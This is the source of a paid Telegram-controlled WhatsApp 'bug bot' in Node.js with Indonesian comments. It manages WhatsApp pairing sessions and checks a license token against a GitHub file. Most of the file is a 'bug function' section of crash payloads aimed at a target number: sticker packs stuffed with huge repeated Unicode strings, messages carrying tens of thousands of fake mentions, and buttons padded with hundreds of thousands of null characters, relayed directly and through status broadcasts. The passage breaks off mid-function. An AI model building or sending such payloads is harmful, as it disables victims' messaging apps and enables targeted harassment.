const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const startTime = Date.now();

function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const defaultSettings = {
  cooldown: 60, // detik
  groupOnly: false
};

if (!fs.existsSync('./settings.json')) {
  fs.writeFileSync('./settings.json', JSON.stringify(defaultSettings, null, 2));
}

let settings = JSON.parse(fs.readFileSync('./settings.json'));

const cooldowns = new Map();

function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "Premium ✅" : "",
    supervip: isSupervip(userId) ? "SuperVip ✅" : "",
    owner: isOwner(userId) ? "Owner ✅" : ""
  };
}

function getUserStatus(userId) {
  const { premium, supervip, owner } = badge(userId);

  if (owner) return owner;
  if (supervip) return supervip;
  if (premium) return premium;
  return "No Access ❌";
}
//msg.key.id

function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

//function group only
bot.on('message', (msg) => {
  const chatType = msg.chat.type;
if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 Bot ini hanya bisa digunakan di *grup*.', {
    parse_mode: 'Markdown'
  });
}

});

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
//fungsi penginisialisasi
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
//otomatis membuat file session
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
//function info koneksi message bot
async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
╭━━━⭓「 𝐒𝐓𝐀𝐑𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
╭━━━⭓「 𝐑𝐄 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
        \`\`\`
╭━━━⭓「 𝐋𝐎𝐒𝐓 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
        \`\`\`
╭━━━⭓「 ☇ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 ° 」
║  𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const reqCodeAxz = "ALWYSNUU";
          const code = await sock.requestPairingCode(botNumber.trim(), reqCodeAxz);
          await bot.editMessageText(
            `
            \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆  ☇ 𝐂𝐨𝐃𝐄 ° 」
║  𝐂𝐎𝐃𝐄 : ${code}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
          \`\`\`
╭━━━⭓「 𝐏𝐀𝐢𝐑𝐢𝐍𝐆 ☇ 𝐄𝐑𝐑𝐨𝐑 ° 」
║  𝐑𝐄𝐀𝐒𝐨𝐍 : ${error.message}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
//definisi bot token dari file config.js
const { BOT_TOKEN } = require("./config.js");

// DATABASE SECTION 
const GITHUB_RAW_URL =
  "https://raw.githubusercontent.com/AlwaysNuuu/always/refs/heads/main/database.json";

async function checkTokenInGitHub(tokenToCheck) {
  try {
    const response = await axios.get(GITHUB_RAW_URL);
    const tokensData = response.data;

    if (!tokensData || !Array.isArray(tokensData.tokens)) {
      console.error("Format data dari GitHub salah atau tidak ada field 'tokens'");
      return false;
    }

    return tokensData.tokens.some(t => t.trim() === tokenToCheck.trim());
  } catch (error) {
    console.error("Gagal mengakses GitHub:", error.message);
    return false;
  }
}

// Start Validasi
async function initializeBot() {
  console.clear();

  const isValid = await checkTokenInGitHub(BOT_TOKEN);

  if (isValid) {
    // ✅ Token VALID 
    console.clear();
    console.log(chalk.bold.green("\nAlwaysNuuu SYSTEM"));
    console.log(chalk.bold.white("DEVELOPER: @AlwaysNuuu"));
    console.log(chalk.bold.white("VERSION: 1.0"));
    console.log(chalk.bold.white("TOKEN: ") + chalk.bold.green("VALID"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR BUYING THIS SCRIPT..."));
  } 
  if (!isValid) {
    // ❌ Token TIDAK VALID 
    console.clear();
    console.log(chalk.bold.red("\nAlwaysNuuu SYSTEM "));
    console.log(chalk.bold.white("DEVELOPER: @AlwaysNuuu"));
    console.log(chalk.bold.white("VERSION: 1.0"));
    console.log(chalk.bold.white("TOKEN: ") + chalk.bold.red("TIDAK VALID"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.red("OFFLINE\n\n"));
    console.log(chalk.bold.white("DASAR YAPIT ! NYOLONG MULU ANJ 🤭"));
    process.exit(1);
  }
}

initializeBot();

// BUG FUNCTION SECTION
// TARO FUNCT COLONGAN MU DISINI 🤭

  async function blankChat(sock, jid) {
                    await sock.relayMessage(jid, {
                        stickerPackMessage: {
                            stickerPackId: "X",
                            name: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~   ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                            publisher: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~   ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                            stickers: [
                                {
                                    fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                },
                                {
                                    fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                                    isAnimated: false,
                                    emojis: ["🦠"],
                                    accessibilityLabel: "dvx",
                                    isLottie: true,
                                    mimetype: "application/pdf"
                                }
                            ],
                            fileLength: "999999",
                            fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                            fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                            mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
                            directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
                            contextInfo: {},
                            packDescription: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~ ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                            mediaKeyTimestamp: "1741150286",
                            trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                            thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
                            thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
                            thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
                            thumbnailHeight: 252,
                            thumbnailWidth: 252,
                            imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
                            stickerPackSize: "999999999",
                            stickerPackOrigin: "1"
                        }
                    }, {
                      participant : jid
                    });
                  }

async function spay(sock, jid) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 70000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

  const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999", // Nilai besar
      requestFrom: jid,
      noteMessage: {
        extendedTextMessage: {
          text: "\u0000",
          contextInfo: {
            mentionedJid: mentionedList,
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
             message: {
                text: "Snitch Xopown",
                footer: "XxX",
                buttons: [{
                    buttonId:"\u0000".repeat(850000),    
                    buttonText: {
                        displayText: '~𑇂𑆵𑆴𑆿'.repeat(50000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
              }
            }
          }
        }
      },
      expiryTimestamp: "9999999999",
      amount: {
        value: "999999999",
        currencyCode: "USD"
      },
      contextInfo: {
        forwardingScore: 999,
        isForwarded: false
      }
    }
  };

await sock.relayMessage(jid, message, {
      participant : { jid: jid }
  });
}

        async function ZeroRadiactive(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
    fileLength: "5945180",
    seconds: 17,
    mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
    height: 1280,
    width: 720,
    fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
    directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "Rtr68xZ6G4TzcRHjr2QpMxn4BDOY3u/wOhpZ7qJj+Cg8o5+aXkCfIr2XfjcFmaQk/CgQLAOyAU6D5mHVhXkKxHpzrhZ2koMZVQLsRHAd5KwxayVXt+6eSl8ZnzpxdFhQ+HTByMt4tpTA39l6zU/jpCdDR/qzd/0Rs3qqwCuswd5ZiUf1c0CB9GwQUmc+yFFux6mspHm/gUe+TkftR2ZiKtf3Y5j9RmHHt9IuFX1KVj9jNj20ZfOJptjEYhgDwfDBIdr3/ddRQNaAlRyp2wTh8XEKUynBSbONgnjPIkj8JEl0OsFJqMeTwQyub9HsM/vRa6o8av0NHBn37ZO8Nag05Dpdvon0swsdnXDtomN6q4x+ls2RfnSeEAvRFGsgiG8H8naybUUY0uhYDpPBYHvuH/9fRwDOD9SPITongjimPplk0GOOmfeAamC9EbhDs/c8/5XL40AUbvshQDLIG3l0oTV4ta6zy/VdAclglFmhfVqeedilMk+lG29lpfIbag1nFu+qPZLIieXYQJ418DtASPmFtbsNYkvprPx7xF9ZtyoIa6gZ+v/4qCigvshtRf5n9msopfNJjyPLIrMAoq1475aB4j3puzXwkNm5NSVIahkuX1HWPnApe5lgOzymvJj3N/n0JCg/+PIYv4Jm6z0ZInZRxt3hrvXObchfVIkVuSKqd5U8WIjoOf+FI+CrvdaZBnb+2KH8A1GkskhNTL3DO+Sv1qYRlBFsk21So8abrZlqspnfVMF7DSoJen6s8GowXbrrJZPvwDnhhzL4IKjY0mrUzxnwTeCycU6OstR/ZKMkbg7OUA3+g+pM1k6eLdN53mkMKCt13WwvXndvmW/ekTMqOYc/rjoFQovbTPhcAMTX/kLegR3meuhxBvNE8xXyYvrI6lIIeGpNNsV32O03Li99BwF7hG7OxydsX0/OsYqJnPAUqvUdb1L9dTafihVeZPdokMN4VjqohFhgZiPsaNQScWDL/kAokANUdQ5QgEy6cn5/stxZMb0H7+grn3jHyBX7TfCnA7xjnyLJ4EEn1GN1NwapIyCP2+wwO4ewVHtkcEN88tzj5XIpYTASomq3ITa0iuZiparFg4Th3OGGKNCF4dwOnwARxsAhQisJUFr7mZq6qS6rTAvXWBkIDjr/3+FSvbG5RJJzMl9a1NN9tj4+epOQqkSKzjWbhv0f6fI1FTlJOpKkfsE5HIdWDg==",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});

    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
        messageId: msg1.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
        messageId: msg2.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}

async function bulldozer1GB(sock, jid) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}


  async function InVisibleX(sock, jid, mention) {
            let msg = await generateWAMessageFromContent(jid, {
                buttonsMessage: {
                    text: " ✦ ",
                    contentText:
                        "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
                    footerText: "vip",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦" + "\u0000".repeat(500000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [jid],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: jid },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (mention) {
                await sock.relayMessage(
                    jid,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "hmmm",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }

async function FreezePackk(sock, jid) {
    await sock.relayMessage(jid, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "𐍃𐌍𐌉𐌕𐌂𐌇" + "ꦾ".repeat(70000),
      publisher: "𐍃𐌍𐌉𐌕𐌂𐌇.id" + "",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
